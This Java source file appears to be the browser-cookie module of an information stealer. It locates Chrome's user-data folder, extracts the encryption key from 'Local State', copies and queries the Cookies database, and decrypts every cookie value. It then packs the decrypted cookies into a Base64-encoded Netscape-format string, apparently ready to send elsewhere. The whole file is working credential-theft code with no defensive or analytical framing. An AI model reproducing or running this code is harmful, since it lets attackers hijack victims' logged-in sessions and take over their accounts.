package io.github.luxotick.impl.cookies;

import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import io.github.luxotick.utils.DecryptUtil;
import io.github.luxotick.utils.DriverUtil;
import io.github.luxotick.utils.KeyUtil;

import java.io.File;
import java.nio.file.Files;
import java.sql.Connection;
import java.sql.ResultSet;
import java.util.Base64;
import java.util.HashMap;
import java.util.Properties;
public class Chrome {
    private static final File appData = new File(System.getenv("APPDATA"));
    private static final File localAppData = new File(System.getenv("LOCALAPPDATA"));
    private static final HashMap<String, String> paths = new HashMap<String, String>() {
        String A = "\\Google\\Chrome\\User Data";
        {
            put("Google Chrome", localAppData + A);
        }
    };

    private final JsonArray cookies = new JsonArray();

    public String grabCookies() {
        crawlUserData();
        String cookieStr = "";
        for (JsonElement cookie : cookies) {
            cookieStr += cookie.getAsJsonObject().get("hostKey").getAsString() + "\t" + "TRUE" + "\t" + "/" + "\t" + "FALSE" + "\t" + "2597573456" + "\t" + cookie.getAsJsonObject().get("name").getAsString() + "\t" + cookie.getAsJsonObject().get("value").getAsString() + "\n";
        }
        return Base64.getEncoder().encodeToString(cookieStr.getBytes());
    }

    private void crawlUserData() {
        for (String browser : paths.keySet()) {
            File userData = new File(paths.get(browser));
            if (!userData.exists()) continue;
            byte[] key = KeyUtil.getKey(new File(userData, "Local State"));
            String B = "\\Default\\Network";
            File networkDir = new File(userData, B);
            if (!networkDir.exists()) continue;
            for (File data : networkDir.listFiles()) {
                if (data.getName().equals("Cookies")) {
                    crawlCookies(data, key);
                }
            }
        }
    }

    private void crawlCookies(File cookieFile, byte[] key) {
        try {
            File tempCookieData = File.createTempFile("TempCookies", null);
            tempCookieData.deleteOnExit();
            Files.copy(cookieFile.toPath(), tempCookieData.toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
            java.sql.Driver driver = DriverUtil.getDriver();
            Properties props = new Properties();
            Connection connection = driver.connect("jdbc:sqlite:" + tempCookieData.getAbsolutePath(), props);
            ResultSet resultSet = connection.createStatement().executeQuery("SELECT host_key, name, encrypted_value FROM cookies");
            while (resultSet.next()) {
                String hostKey = resultSet.getString(1);
                String name = resultSet.getString(2);
                byte[] encryptedValue = resultSet.getBytes(3);
                if (hostKey != null && name != null && encryptedValue != null) {
                    String decryptedValue = DecryptUtil.decrypt(encryptedValue, key);
                    if (!decryptedValue.equals("")) {
                        JsonObject cookie = new JsonObject();
                        cookie.addProperty("hostKey", hostKey);
                        cookie.addProperty("name", name);
                        cookie.addProperty("value", decryptedValue);
                        cookies.add(cookie);
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
